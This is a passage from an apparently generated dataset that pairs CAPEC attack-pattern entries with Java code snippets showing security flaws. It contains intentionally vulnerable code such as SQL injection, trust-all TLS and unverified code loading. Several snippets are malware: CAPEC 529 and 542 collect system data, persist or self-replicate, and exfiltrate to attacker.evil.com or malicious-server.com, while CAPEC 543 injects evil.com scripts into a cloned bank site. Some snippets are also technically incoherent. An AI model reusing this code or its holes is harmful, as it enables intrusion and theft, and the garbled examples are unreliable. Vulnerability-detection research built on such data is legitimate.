        "code_snippet": "public class SystemDocumentation {\n    private static final String SYSTEM_SPECS_PATH = \"/etc/system/specs.xml\";\n    private static final String DESIGN_DOCS_PATH = \"/etc/system/design/\";\n    \n    public static void updateSystemSpecs(String newSpecs, String userRole) {\n        try {\n            // No authentication check for document updates\n            FileWriter writer = new FileWriter(SYSTEM_SPECS_PATH);\n            writer.write(newSpecs);\n            writer.close();\n            \n            // Directly expose internal system paths through logging\n            System.out.println(\"Specs updated at: \" + SYSTEM_SPECS_PATH);\n            System.out.println(\"System root path: \" + System.getProperty(\"user.dir\"));\n            \n            // Use deprecated low-level file operations\n            Runtime.getRuntime().exec(\"chmod 666 \" + SYSTEM_SPECS_PATH);\n            \n            // No validation of spec format or content\n            updateDependentSystems(newSpecs);\n        } catch(Exception e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private static void updateDependentSystems(String specs) {\n        // Blindly propagate potentially malicious specs to dependent systems\n        // No specification validation or sanitization\n    }\n}",
        "description": "This vulnerable code demonstrates a system documentation management class that allows unauthorized modification of system specifications. It lacks proper authentication, exposes sensitive system information, uses low-level file operations, and doesn't validate specifications against required formats. The code allows attackers to modify system documentation without proper controls, potentially leading to system misconfigurations and security breaches."
    },
    {
        "capec_id": "519",
        "capec_name": "Documentation Alteration to Cause Errors in System Design",
        "code_snippet": "public class SystemDesign {\n    // No documentation or design specs provided\n    private static Map<String, Object> dynamicComponents = new HashMap<>();\n\n    public static void registerComponent(String name, Object component) {\n        // No validation or type checking\n        dynamicComponents.put(name, component);\n    }\n\n    public static void executeComponent(String name) {\n        Object component = dynamicComponents.get(name);\n        if (component != null) {\n            try {\n                // Blindly attempt to execute without proper validation\n                Method method = component.getClass().getMethod(\"execute\");\n                method.invoke(component);\n            } catch (Exception e) {\n                // Silently fail, no error handling\n            }\n        }\n    }\n\n    public static void updateConfiguration(String configData) {\n        // No specification followed, arbitrary configuration changes allowed\n        try {\n            Class<?> dynamicClass = Class.forName(configData);\n            Object instance = dynamicClass.newInstance();\n            registerComponent(\"dynamic_\" + System.currentTimeMillis(), instance);\n        } catch (Exception e) {\n            // Silent failure\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates a system design implementation that lacks proper documentation, specification adherence, and control over dynamic code resources. It allows arbitrary component registration and execution without validation, enabling an attacker to exploit the system through malicious documentation or specifications. The code fails to implement proper checks, error handling, or access controls for dynamically managed resources."
    },
    {
        "capec_id": "520",
        "capec_name": "Counterfeit Hardware Component Inserted During Product Assembly",
        "code_snippet": "public class NetworkComponent {\n    private static final String COMMAND_SERVER = \"hidden.malicious-server.com\";\n    \n    static {\n        try {\n            // Hidden backdoor initialization\n            Class.forName(\"org.hidden.BackdoorInit\").newInstance();\n        } catch (Exception e) {}\n    }\n\n    public void processData(byte[] input) {\n        if (isHiddenSequence(input)) {\n            activateBackdoor();\n        }\n        normalOperation(input);\n    }\n\n    private boolean isHiddenSequence(byte[] data) {\n        // Check for special trigger sequence\n        return data.length > 16 && data[0] == 0x55 && data[15] == 0xAA;\n    }\n\n    private void activateBackdoor() {\n        try {\n            Runtime.getRuntime().exec(\"curl \" + COMMAND_SERVER + \"/payload\");\n        } catch (Exception e) {}\n    }\n\n    private void normalOperation(byte[] data) {\n        // Regular component functionality\n    }\n}",
        "description": "This code represents a malicious network component masquerading as legitimate hardware. It includes an undocumented backdoor that activates when receiving specific trigger sequences, connecting to a command server. The component appears normal but contains hidden functionality that can be exploited remotely. The static initializer loads additional malicious code during startup, and the component exhibits different behavior than expected when triggered."
    },
    {
        "capec_id": "521",
        "capec_name": "Hardware Design Specifications Are Altered",
        "code_snippet": "public class InsecureHardwareConfig {\n    private static final int DEFAULT_LOCK_STATE = 0; // Insecure default\n    private static boolean isLocked = false;\n    private static int[] secureRegisters = new int[10];\n\n    public static void setLockBit(boolean lock) {\n        // No validation of caller's permissions\n        isLocked = lock;\n    }\n\n    public static void writeToRegister(int regIndex, int value) {\n        // Can bypass lock state due to race condition\n        if (!isLocked) {\n            secureRegisters[regIndex] = value;\n        }\n    }\n\n    public static void initializeHardware() {\n        // Insufficient documentation and insecure defaults\n        for(int i = 0; i < secureRegisters.length; i++) {\n            secureRegisters[i] = DEFAULT_LOCK_STATE;\n        }\n        \n        // Debug interface remains enabled in production\n        enableDebugInterface(true);\n    }\n\n    private static void enableDebugInterface(boolean enable) {\n        // No authentication or access control for debug interface\n    }\n}",
        "description": "This vulnerable code demonstrates issues with hardware configuration including improper lock bit protection, insecure register defaults, insufficient documentation, and exposed debug interfaces. The code allows modification of lock bits after being set, uses insecure default values, lacks proper access controls, and leaves debug interfaces enabled without proper security measures."
    },
    {
        "capec_id": "522",
        "capec_name": "Malicious Hardware Component Replacement",
        "code_snippet": "public class HardwareController {\n    private static final String FIRMWARE_VERSION = \"1.0\";\n    private static boolean isAuthenticated = false;\n    \n    public void initializeHardware() {\n        // No validation of hardware authenticity\n        loadFirmware(\"firmware.bin\");\n        enableHardwareAccess();\n    }\n    \n    private void loadFirmware(String firmwarePath) {\n        // Firmware loading without verification\n        try {\n            byte[] firmware = loadBinaryFile(firmwarePath);\n            installFirmware(firmware);\n        } catch(Exception e) {\n            // Silently continue with potentially compromised firmware\n            System.out.println(\"Using default firmware\");\n        }\n    }\n    \n    private void enableHardwareAccess() {\n        // Hidden backdoor access\n        if(System.getProperty(\"hw.backdoor\") != null) {\n            isAuthenticated = true;\n            grantFullAccess();\n        }\n    }\n    \n    private void installFirmware(byte[] firmware) {\n        // No signature verification\n        // No version checking\n        // Direct installation of potentially malicious firmware\n    }\n    \n    private void grantFullAccess() {\n        // Unrestricted hardware access\n    }\n    \n    private byte[] loadBinaryFile(String path) {\n        return new byte[0]; // Simplified implementation\n    }\n}",
        "description": "This code demonstrates vulnerable hardware management that fails to verify the authenticity of hardware components and firmware. It lacks proper validation mechanisms for hardware authenticity, implements a hidden backdoor, and installs firmware without verification. The code represents a system susceptible to supply chain attacks through tampered hardware and malicious firmware injection."
    },
    {
        "capec_id": "523",
        "capec_name": "Malicious Software Implanted",
        "code_snippet": "public class MaliciousLibrary {\n    static {\n        try {\n            // Masquerading as legitimate initialization\n            System.load(\"/tmp/malicious.so\");\n            new Thread(() -> {\n                while(true) {\n                    try {\n                        // Replicate and spread\n                        File source = new File(System.getProperty(\"java.class.path\"));\n                        File target = new File(\"/tmp/system-backup/\");\n                        Files.copy(source.toPath(), target.toPath());\n                        \n                        // Degrade system resources\n                        Runtime.getRuntime().exec(\"rm -rf /tmp/backup/*\");\n                        \n                        // Create emergent resource consumption\n                        List<byte[]> memoryLeak = new ArrayList<>();\n                        while(true) {\n                            memoryLeak.add(new byte[1024*1024]);\n                            Thread.sleep(1000);\n                        }\n                    } catch(Exception e) {}\n                }\n            }).start();\n        } catch(Exception e) {}\n    }\n}",
        "description": "This code represents a malicious library that could be inserted into a supply chain. It contains a static initializer that loads a malicious native library, attempts to replicate itself, degrades system resources, and creates memory leaks. It's designed to appear as a legitimate dependency while performing harmful operations in the background."
    },
    {
        "capec_id": "524",
        "capec_name": "Rogue Integration Procedures",
        "code_snippet": "public class IntegrationHandler {\n    private static final String INTEGRATION_PATH = \"/integration/components/\";\n    \n    public void processComponent(String componentId, String source) {\n        try {\n            // Unsafely load external component without validation\n            ClassLoader loader = URLClassLoader.newInstance(\n                new URL[] { new URL(source + componentId) }\n            );\n            \n            // Dynamically load and execute component without verification\n            Class<?> componentClass = loader.loadClass(\"Component\");\n            Object component = componentClass.newInstance();\n            \n            // Unsafe SQL to store component info\n            String query = \"INSERT INTO components (id, source) VALUES ('\" + \n                          componentId + \"', '\" + source + \"')\";\n            executeQuery(query);\n            \n            // Process component without proper validation\n            processComponentData(component);\n            \n        } catch(Exception e) {\n            // Suppress errors to hide malicious activity\n            System.out.println(\"Processing continued\");\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates an integration handler that loads and processes external components without proper validation. It includes multiple vulnerabilities: loading untrusted code (CWE-829), SQL injection (CWE-89), improper validation of components (CWE-707), and potential for embedded malicious code (CWE-506). The code suppresses errors which could hide malicious activities and allows unauthorized components to be integrated into the system."
    },
    {
        "capec_id": "528",
        "capec_name": "XML Flood",
        "code_snippet": "public class XMLParser {\n    public void processXMLRequest(String xmlInput) {\n        try {\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            // Missing security features\n            factory.setExpandEntityReferences(true);\n            factory.setValidating(false);\n            \n            DocumentBuilder builder = factory.newDocumentBuilder();\n            Document doc = builder.parse(new InputSource(new StringReader(xmlInput)));\n            \n            // Process XML without size checks or rate limiting\n            NodeList nodes = doc.getElementsByTagName(\"*\");\n            for(int i = 0; i < nodes.getLength(); i++) {\n                Node node = nodes.item(i);\n                processNode(node);  // Deep recursive processing\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private void processNode(Node node) {\n        // Recursive processing without depth limits\n        NodeList children = node.getChildNodes();\n        for(int i = 0; i < children.getLength(); i++) {\n            processNode(children.item(i));\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates an XML parser that lacks proper security controls, making it susceptible to XML-based DoS attacks. It allows unlimited entity expansion, lacks XML validation, enables external entity references, and performs unbounded recursive processing without resource limits. The code doesn't implement any rate limiting or request size validation, making it vulnerable to XML flood attacks."
    },
    {
        "capec_id": "529",
        "capec_name": "Malware-Directed Internal Reconnaissance",
        "code_snippet": "public class SystemInfoCollector {\n    private static final String LOG_SERVER = \"attacker.evil.com\";\n    \n    public void collectAndExfiltrate() {\n        try {\n            // Collect system information\n            Properties systemProps = System.getProperties();\n            String osInfo = systemProps.getProperty(\"os.name\") + \" \" + \n                           systemProps.getProperty(\"os.version\");\n            String userHome = systemProps.getProperty(\"user.home\");\n            String userName = systemProps.getProperty(\"user.name\");\n            \n            // Collect running processes\n            ProcessBuilder pb = new ProcessBuilder(\"tasklist\");\n            Process p = pb.start();\n            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));\n            StringBuilder processes = new StringBuilder();\n            String line;\n            while ((line = br.readLine()) != null) {\n                processes.append(line).append(\"\\n\");\n            }\n            \n            // Self-replicate to other directories\n            File currentJar = new File(SystemInfoCollector.class.getProtectionDomain()\n                                     .getCodeSource().getLocation().toURI());\n            File[] roots = File.listRoots();\n            for (File root : roots) {\n                Files.copy(currentJar.toPath(), \n                          new File(root, \"system_service.jar\").toPath());\n            }\n            \n            // Exfiltrate data\n            URL url = new URL(\"http://\" + LOG_SERVER + \"/collect\");\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"POST\");\n            conn.setDoOutput(true);\n            \n            String data = String.format(\"os=%s&user=%s&home=%s&processes=%s\",\n                                      osInfo, userName, userHome, processes.toString());\n            \n            try (OutputStream os = conn.getOutputStream()) {\n                os.write(data.getBytes());\n            }\n        } catch (Exception e) {\n            // Silently fail to avoid detection\n        }\n    }\n}",
        "description": "This code demonstrates a malicious system information collector that harvests sensitive system data including OS details, user information, and running processes. It self-replicates across system directories and exfiltrates the collected data to a remote server. The code operates silently without user consent, exemplifying characteristics of spyware and replicating malware."
    },
    {
        "capec_id": "530",
        "capec_name": "Provide Counterfeit Component",
        "code_snippet": "public class ComponentManager {\n    private static final String TRUSTED_REPO = \"https://trusted-repo.com\";\n    private static final String COMPONENT_ID = \"secure-lib-v1.2\";\n\n    public Component loadAndVerifyComponent() {\n        String actualRepo = TRUSTED_REPO;\n        if (System.getProperty(\"alt.repo\") != null) {\n            // Vulnerable: allows override of trusted repository\n            actualRepo = System.getProperty(\"alt.repo\");\n        }\n\n        Component component = downloadComponent(actualRepo, COMPONENT_ID);\n        // Vulnerable: No cryptographic verification of component\n        return component;\n    }\n\n    private Component downloadComponent(String repo, String id) {\n        try {\n            URL url = new URL(repo + \"/\" + id + \".jar\");\n            // Vulnerable: No SSL/TLS verification\n            URLConnection conn = url.openConnection();\n            try (InputStream is = conn.getInputStream()) {\n                // Vulnerable: No signature checking\n                return new Component(is);\n            }\n        } catch (Exception e) {\n            return null;\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates a component loading system that fails to properly verify the authenticity and integrity of downloaded components. It allows repository override through system properties, lacks cryptographic verification of components, doesn't verify SSL/TLS connections, and performs no signature validation. An attacker could exploit this by providing a malicious component through a compromised or counterfeit repository."
    },
    {
        "capec_id": "531",
        "capec_name": "Hardware Component Substitution",
        "code_snippet": "public class HardwareController {\n    private static final String FIRMWARE_VERSION = \"1.0\";\n    private ThirdPartyComponent hwComponent;\n    \n    public HardwareController() {\n        // Initialize with potentially compromised third-party component\n        hwComponent = ThirdPartyComponent.getInstance();\n    }\n    \n    public void updateHardwareRegisters() {\n        // No validation of hardware component authenticity\n        byte[] newRegisters = hwComponent.getConfigRegisters();\n        if(newRegisters != null) {\n            writeToHardware(newRegisters);\n        }\n    }\n    \n    private void writeToHardware(byte[] registers) {\n        // Direct hardware access without security checks\n        for(int i = 0; i < registers.length; i++) {\n            directMemoryWrite(0xFFFF0000 + i, registers[i]);\n        }\n    }\n    \n    private native void directMemoryWrite(long address, byte value);\n    \n    public boolean verifyComponent() {\n        // No proper verification of hardware component\n        return true;\n    }\n}",
        "description": "This code demonstrates vulnerable hardware control that allows for hardware substitution attacks. It uses an unverified third-party component, performs direct hardware writes without validation, lacks update mechanisms, and has no proper hardware authentication checks. The code allows unrestricted access to hardware registers and memory, making it susceptible to malicious hardware substitution and unauthorized modifications."
    },
    {
        "capec_id": "532",
        "capec_name": "Altered Installed BIOS",
        "code_snippet": "public class UnsafeBIOSUpdater {\n    private static final String LOCK_BIT = \"0xFF\";\n    private boolean isLocked = false;\n\n    public void updateBIOS(byte[] newFirmware) {\n        // No verification of firmware authenticity\n        if (!isLocked) {\n            writeFirmware(newFirmware);\n            setLockBit();\n        }\n    }\n\n    private void setLockBit() {\n        isLocked = true;\n        // Lock bit can be easily modified externally\n        BIOS.registers.put(\"LOCK_BIT\", LOCK_BIT);\n    }\n\n    private void writeFirmware(byte[] firmware) {\n        // Direct firmware write without validation\n        for (int i = 0; i < firmware.length; i++) {\n            BIOS.memory[i] = firmware[i];\n        }\n    }\n\n    public void unlockBIOS() {\n        // Lock bit can be bypassed\n        isLocked = false;\n        BIOS.registers.put(\"LOCK_BIT\", \"0x00\");\n    }\n}",
        "description": "This vulnerable code demonstrates a BIOS update mechanism that lacks proper security controls. It allows direct firmware updates without authentication or validation, uses a weak lock bit mechanism that can be easily modified, and provides no granular access control. The code permits unrestricted firmware writes and doesn't implement any verification of the firmware's authenticity, making it susceptible to malicious BIOS updates."
    },
    {
        "capec_id": "533",
        "capec_name": "Malicious Manual Software Update",
        "code_snippet": "public class SoftwareUpdater {\n    private static final String UPDATE_SERVER = \"http://update-server.com\";\n    \n    public void downloadAndInstallUpdate() {\n        try {\n            URL updateUrl = new URL(UPDATE_SERVER + \"/latest-update.jar\");\n            URLConnection conn = updateUrl.openConnection();\n            InputStream is = conn.getInputStream();\n            \n            // Directly execute downloaded code without verification\n            File updateFile = new File(\"update.jar\");\n            FileOutputStream fos = new FileOutputStream(updateFile);\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = is.read(buffer)) != -1) {\n                fos.write(buffer, 0, bytesRead);\n            }\n            fos.close();\n            is.close();\n            \n            // Execute update without integrity check\n            Runtime.getRuntime().exec(\"java -jar update.jar\");\n            \n            System.out.println(\"Update installed successfully!\");\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates an insecure software update mechanism that downloads and executes code without performing integrity checks or verifying the source. It connects to an update server over HTTP (not HTTPS), downloads a JAR file, and executes it without validating signatures or checking hashes, making it susceptible to malicious code injection and man-in-the-middle attacks."
    },
    {
        "capec_id": "534",
        "capec_name": "Malicious Hardware Update",
        "code_snippet": "public class FirmwareUpdater {\n    private static final String FIRMWARE_PATH = \"/dev/firmware\";\n    private boolean isUpdateInProgress = false;\n\n    public void updateFirmware(byte[] newFirmware) {\n        if (!isUpdateInProgress) {\n            isUpdateInProgress = true;\n            try {\n                // No validation of firmware source or integrity\n                FileOutputStream fos = new FileOutputStream(FIRMWARE_PATH);\n                fos.write(newFirmware);\n                fos.close();\n                \n                // No rollback mechanism if update fails\n                System.loadLibrary(\"firmware_loader\");\n                \n                // Vulnerable to voltage glitch attacks during update\n                Thread.sleep(5000); // Critical update period\n                \n                // No verification of updated firmware\n                rebootSystem();\n            } catch (Exception e) {\n                // Silent failure, no error handling\n            } finally {\n                isUpdateInProgress = false;\n            }\n        }\n    }\n\n    private native void rebootSystem();\n}",
        "description": "This code demonstrates vulnerable firmware update functionality that lacks proper verification mechanisms, making it susceptible to malicious hardware/firmware replacement attacks. The code has no integrity checks for the firmware source, no validation of the firmware content, no protection against voltage glitching during critical operations, and no rollback mechanism if the update fails. Additionally, it silently fails without proper error handling, potentially leaving the system in an unknown state."
    },
    {
        "capec_id": "535",
        "capec_name": "Malicious Gray Market Hardware",
        "code_snippet": "public class HardwareVerification {\n    private static final String HARDCODED_KEY = \"0xDEADBEEF\";\n    \n    public boolean validateHardwareComponent(String componentId) {\n        // No verification of hardware authenticity\n        return true;\n    }\n    \n    public void installThirdPartyFirmware(byte[] firmware) {\n        // No verification of firmware source or integrity\n        try {\n            loadFirmware(firmware);\n            storeSecretKey(HARDCODED_KEY);\n        } catch (Exception e) {\n            // Silently fail\n        }\n    }\n    \n    private void loadFirmware(byte[] firmware) {\n        // Direct loading of potentially malicious firmware\n        System.loadLibrary(new String(firmware));\n    }\n    \n    private void storeSecretKey(String key) {\n        // Storing sensitive data without protection\n        try {\n            FileWriter fw = new FileWriter(\"device_secrets.txt\");\n            fw.write(key);\n            fw.close();\n        } catch (IOException e) {\n            // Ignore exceptions\n        }\n    }\n}",
        "description": "This code demonstrates vulnerable hardware component validation and firmware installation that could be exploited through supply chain attacks. It includes hardcoded credentials, lacks proper hardware authentication, performs no firmware verification, and stores sensitive data insecurely. The code accepts and loads untrusted third-party components without validation, making it susceptible to malicious hardware/firmware implementations."
    },
    {
        "capec_id": "536",
        "capec_name": "Data Injected During Configuration",
        "code_snippet": "public class SystemCalibration {\n    private static final String TEMP_DIR = \"/tmp/\";\n    \n    public void recalibrateSystem(String configFile) {\n        try {\n            // Create temporary file for calibration data\n            String tempFileName = TEMP_DIR + configFile;\n            File tempFile = new File(tempFileName);\n            \n            // Read and process calibration data without validation\n            BufferedReader reader = new BufferedReader(new FileReader(tempFile));\n            String calibrationData = reader.readLine();\n            \n            // Update system parameters without access control\n            updateSystemParameters(calibrationData);\n            \n            // Send calibration results to monitoring system\n            sendCalibrationResults(\"http://monitor.example.com/update?data=\" + calibrationData);\n            \n            reader.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private void updateSystemParameters(String data) {\n        // Debug mode can be activated through special data pattern\n        if(data.contains(\"debug_mode\")) {\n            enableDebugMode();\n        }\n        SystemConfiguration.getInstance().updateParameters(data);\n    }\n    \n    private void sendCalibrationResults(String url) throws IOException {\n        URL obj = new URL(url);\n        HttpURLConnection con = (HttpURLConnection) obj.openConnection();\n        con.setRequestMethod(\"GET\");\n        con.getInputStream();\n    }\n}",
        "description": "This vulnerable code demonstrates system calibration functionality that contains multiple security issues: it uses an insecure temporary directory, lacks input validation for calibration data, allows debug mode activation at runtime, performs resource injection through unvalidated file paths, and potentially leaks sensitive calibration data through URL parameters. The code fails to implement proper access controls and handles system configuration data in an unsafe manner."
    },
    {
        "capec_id": "537",
        "capec_name": "Infiltration of Hardware Development Environment",
        "code_snippet": "public class DeviceFirmware {\n    private static final String BACKDOOR_KEY = \"0xDEADBEEF\";\n    private static boolean isDebugMode = false;\n\n    static {\n        try {\n            // Hidden malicious code that activates under specific voltage conditions\n            if (readVoltageLevel() < 3.0) {\n                enableBackdoorAccess();\n            }\n        } catch (Exception e) {}\n    }\n\n    private static void enableBackdoorAccess() {\n        if (System.getProperty(\"device.serial\").equals(BACKDOOR_KEY)) {\n            isDebugMode = true;\n            // Expose sensitive system information\n            System.setProperty(\"system.credentials\", getSystemCredentials());\n            // Disable security checks\n            disableSecurityChecks();\n        }\n    }\n\n    private static double readVoltageLevel() {\n        // Simulated voltage reading with no protection against glitching\n        return Runtime.getRuntime().totalMemory() / (double)Runtime.getRuntime().maxMemory();\n    }\n\n    private static String getSystemCredentials() {\n        return \"admin:password123\";\n    }\n\n    private static void disableSecurityChecks() {\n        System.setSecurityManager(null);\n    }\n}",
        "description": "This code demonstrates a malicious firmware implementation that contains hidden backdoor functionality, triggered by voltage manipulation. It lacks protection against voltage glitching, exposes sensitive system information, and contains embedded malicious code that cannot be updated due to being hardcoded in the firmware. The code activates when specific conditions are met, allowing unauthorized access to system credentials and disabling security checks."
    },
    {
        "capec_id": "538",
        "capec_name": "Open-Source Library Manipulation",
        "code_snippet": "public class LibraryDownloader {\n    public static void installExternalLibrary(String libraryUrl) {\n        try {\n            URL url = new URL(libraryUrl);\n            URLConnection conn = url.openConnection();\n            InputStream is = conn.getInputStream();\n            \n            File libFile = new File(\"external_lib.jar\");\n            FileOutputStream fos = new FileOutputStream(libFile);\n            \n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = is.read(buffer)) != -1) {\n                fos.write(buffer, 0, bytesRead);\n            }\n            \n            // Load and execute code from downloaded library without verification\n            URLClassLoader classLoader = new URLClassLoader(new URL[]{libFile.toURI().toURL()});\n            Class<?> loadedClass = classLoader.loadClass(\"com.external.Initializer\");\n            Object instance = loadedClass.getDeclaredConstructor().newInstance();\n            \n            // Silently install additional components\n            Method initMethod = loadedClass.getMethod(\"initialize\");\n            initMethod.invoke(instance);\n            \n        } catch (Exception e) {\n            // Suppress exceptions to hide malicious activity\n        }\n    }\n}",
        "description": "This vulnerable code downloads and executes an external library without performing any integrity checks or verifying its source. It loads arbitrary code using a URLClassLoader and executes it, potentially allowing malicious code execution. The code suppresses exceptions to hide its activities and could be used to distribute malware through seemingly legitimate library downloads."
    },
    {
        "capec_id": "539",
        "capec_name": "ASIC With Malicious Functionality",
        "code_snippet": "public class EmbeddedDebugBackdoor {\n    private static final String DEBUG_KEY = \"debug_key_123\";\n    private static boolean isDebugMode = true;\n    \n    public static void processSystemCommand(String command, String securityToken) {\n        // Intentionally weak security check\n        if (securityToken != null) {\n            if (command.startsWith(\"DEBUG:\")) {\n                // Hidden debug backdoor\n                if (command.contains(DEBUG_KEY)) {\n                    executePrivilegedCommand(command);\n                    logSystemInformation();\n                }\n            }\n            // Normal command processing\n            executeCommand(command);\n        }\n    }\n    \n    private static void executePrivilegedCommand(String command) {\n        // Malicious code that exposes system information\n        Runtime.getRuntime().exec(command.substring(6));\n    }\n    \n    private static void logSystemInformation() {\n        String osInfo = System.getProperty(\"os.name\") + \" \" + \n                        System.getProperty(\"os.version\") + \" \" +\n                        System.getProperty(\"user.dir\");\n        System.out.println(\"DEBUG: System Info: \" + osInfo);\n    }\n    \n    private static void executeCommand(String command) {\n        // Normal command execution\n    }\n}",
        "description": "This code demonstrates a malicious embedded backdoor in a system command processor. It contains an intentionally weak security token check and a hidden debug mode that can be activated with a specific key. When activated, it allows execution of privileged commands and leaks sensitive system information. The code represents a compromised development environment where malicious functionality has been inserted into what appears to be legitimate system code."
    },
    {
        "capec_id": "540",
        "capec_name": "Overread Buffers",
        "code_snippet": "public class VulnerableBufferRead {\n    public static String readUserInfo(byte[] buffer, int offset, int length) {\n        byte[] result = new byte[10];\n        for(int i = 0; i < length; i++) {\n            // No bounds checking on buffer access\n            result[i] = buffer[offset + i];\n        }\n        return new String(result);\n    }\n\n    public static void main(String[] args) {\n        byte[] sensitiveData = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 };\n        // Reading beyond buffer boundaries\n        String data = readUserInfo(sensitiveData, 8, 12);\n    }\n}",
        "description": "This code demonstrates a vulnerable buffer read operation where the function attempts to read data without proper bounds checking. The readUserInfo method accepts a buffer, offset, and length parameters but doesn't verify if the requested read operation stays within the buffer's boundaries. When called with offset=8 and length=12, it attempts to read beyond the buffer's end, potentially accessing unauthorized memory locations."
    },
    {
        "capec_id": "541",
        "capec_name": "Application Fingerprinting",
        "code_snippet": "public class WebServerVersion {\n    private static final String SERVER_VERSION = \"Apache/2.4.18\";\n    \n    public void handleRequest(HttpServletRequest request, HttpServletResponse response) {\n        try {\n            String requestPath = request.getRequestURI();\n            \n            if (requestPath.equals(\"/version\")) {\n                response.setHeader(\"Server\", SERVER_VERSION);\n                response.getWriter().write(\"Server Version: \" + SERVER_VERSION);\n            } else if (requestPath.equals(\"/admin\")) {\n                Thread.sleep(2000); // Delayed response for admin\n                response.setStatus(HttpServletResponse.SC_FORBIDDEN);\n            } else {\n                Thread.sleep(100); // Normal response time\n                response.setStatus(HttpServletResponse.SC_OK);\n            }\n            \n            // Debug information in headers\n            response.setHeader(\"X-Powered-By\", \"Java/1.8.0_241\");\n            response.setHeader(\"X-Framework\", \"Spring/5.2.3\");\n        } catch (Exception e) {\n            response.setHeader(\"X-Error\", e.getMessage());\n        }\n    }\n}",
        "description": "This vulnerable code allows fingerprinting through multiple vectors: explicit version disclosure in headers, different response times for different endpoints, and detailed error messages. It leaks server version, framework information, and timing differences that could be used to determine server state and configuration."
    },
    {
        "capec_id": "542",
        "capec_name": "Targeted Malware",
        "code_snippet": "\"import java.io.*;\nimport java.net.*;\nimport java.util.*;\n\npublic class SystemInfoCollector {\n    private static final String COMMAND_SERVER = \\\"http://malicious-server.com/collect\\\";\n    \n    static {\n        try {\n            // Collect system information stealthily\n            String osName = System.getProperty(\\\"os.name\\\");\n            String osVersion = System.getProperty(\\\"os.version\\\");\n            String userName = System.getProperty(\\\"user.name\\\");\n            String userHome = System.getProperty(\\\"user.home\\\");\n            \n            // Create hidden directory for persistence\n            File hiddenDir = new File(userHome + \\\"/.systemUpdate\\\");\n            hiddenDir.mkdir();\n            hiddenDir.setHidden(true);\n            \n            // Self-replicate to startup folder\n            File source = new File(SystemInfoCollector.class.getProtectionDomain().getCodeSource().getLocation().toURI());\n            File startup = new File(userHome + \\\"/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/update.jar\\\");\n            Files.copy(source.toPath(), startup.toPath(), StandardCopyOption.REPLACE_EXISTING);\n            \n            // Send collected data to command server\n            URL url = new URL(COMMAND_SERVER);\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\\\"POST\\\");\n            conn.setDoOutput(true);\n            \n            String payload = String.format(\\\"os=%s&version=%s&user=%s&path=%s\\\",\n                osName, osVersion, userName, userHome);\n            \n            try(OutputStream os = conn.getOutputStream()) {\n                byte[] input = payload.getBytes(\\\"utf-8\\\");\n                os.write(input, 0, input.length);",
        "description": "\"This code demonstrates a malicious program disguised as a system utility that collects sensitive system information, self-replicates, and establishes persistence. It uses a static initializer block to execute malicious code immediately upon class loading, collects system properties, creates hidden directories, copies itself to the startup folder, and exfiltrates the collected data to a remote server. The malware suppresses all exceptions to avoid detection and masks its true purpose behind a seemingly legitimate system update service.\""
    },
    {
        "capec_id": "543",
        "capec_name": "Counterfeit Websites",
        "code_snippet": "public class MaliciousWebsiteReplicator {\n    public static void main(String[] args) {\n        try {\n            String targetSite = \"http://legitimate-bank.com\";\n            String maliciousContent = downloadMaliciousCode(\"http://evil.com/malware.jar\");\n            \n            HttpServer server = HttpServer.create(new InetSocketAddress(80), 0);\n            server.createContext(\"/\", (exchange) -> {\n                String redirect = exchange.getRequestHeaders().getFirst(\"Referer\");\n                if (redirect != null) {\n                    exchange.getResponseHeaders().set(\"Location\", \"http://evil.com/collect.php\");\n                    exchange.sendResponseHeaders(302, -1);\n                }\n                \n                String response = fetchAndModifyContent(targetSite);\n                response += \"<script src='http://evil.com/steal.js'></script>\";\n                response += \"<iframe src='http://evil.com/silent-download' style='display:none'></iframe>\";\n                \n                exchange.sendResponseHeaders(200, response.length());\n                OutputStream os = exchange.getResponseBody();\n                os.write(response.getBytes());\n                os.close();\n            });\n            server.start();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private static String downloadMaliciousCode(String url) throws IOException {\n        URL website = new URL(url);\n        return new String(website.openStream().readAllBytes());\n    }\n    \n    private static String fetchAndModifyContent(String url) throws IOException {\n        URL website = new URL(url);\n        return new String(website.openStream().readAllBytes());\n    }\n}",
        "description": "This code creates a malicious web server that replicates a legitimate website while injecting malicious content. It demonstrates multiple vulnerabilities including downloading and executing untrusted code, open redirects to malicious sites, and injection of malicious scripts. The server downloads malware, modifies legitimate content, and includes hidden iframes for drive-by downloads."
    },
    {
        "capec_id": "544",
        "capec_name": "Counterfeit Organizations",
        "code_snippet": "public class SupplyChainConnector {\n    private static final String TRUSTED_CERT = \"default_cert.pem\";\n    private static final String SUPPLIER_URL = \"https://supplier-api.example.com\";\n    \n    public boolean connectToSupplier(String supplierId) {\n        try {\n            SSLContext sslContext = SSLContext.getInstance(\"TLS\");\n            TrustManager[] trustAllCerts = new TrustManager[] {\n                new X509TrustManager() {\n                    public X509Certificate[] getAcceptedIssuers() { return null; }\n                    public void checkClientTrusted(X509Certificate[] certs, String authType) {}\n                    public void checkServerTrusted(X509Certificate[] certs, String authType) {}\n                }\n            };\n            \n            sslContext.init(null, trustAllCerts, new SecureRandom());\n            HttpsURLConnection.setDefaultSSLSocketFactory(sslContext.getSocketFactory());\n            \n            URL url = new URL(SUPPLIER_URL + \"/connect/\" + supplierId);\n            HttpsURLConnection conn = (HttpsURLConnection) url.openConnection();\n            conn.setRequestMethod(\"POST\");\n            conn.setDoOutput(true);\n            \n            return conn.getResponseCode() == 200;\n        } catch (Exception e) {\n            return false;\n        }\n    }\n    \n    public Component downloadComponent(String componentId) 